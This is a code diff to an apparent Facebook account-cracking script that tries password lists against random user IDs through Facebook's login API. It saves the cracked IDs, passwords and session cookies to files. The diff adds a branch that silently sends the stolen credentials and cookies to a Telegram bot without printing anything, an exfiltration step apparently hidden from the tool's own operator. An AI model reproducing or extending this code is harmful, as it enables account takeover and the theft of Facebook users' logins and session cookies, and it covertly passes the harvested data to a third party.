@@ -1191,14 +1191,21 @@ def rndm3(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        cid = str(po['uid'])
+                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
+                                        open('/sdcard/BITHIKA-RANDOM-M3-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
+                                        oks.append(cid)
                                         cek_apk(coki)
-                                        open('/sdcard/BITHIKA-RANDOM-M3-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
-                                        oks.append(uid)
                                         break
-                        elif 'www.facebook.com' in po['error']['message']:
+                        elif 'access_token' in po:
+                                        cid = str(po['uid'])
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        statusok = (f" {cid} | {pas} | {coki} ")
+                                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+                                        break
+                        elif 'error' in po and 'message' in po['error'] and 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
                                                 print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/BITHIKA-CP.txt','a').write(uid+'|'+pas+'\n')
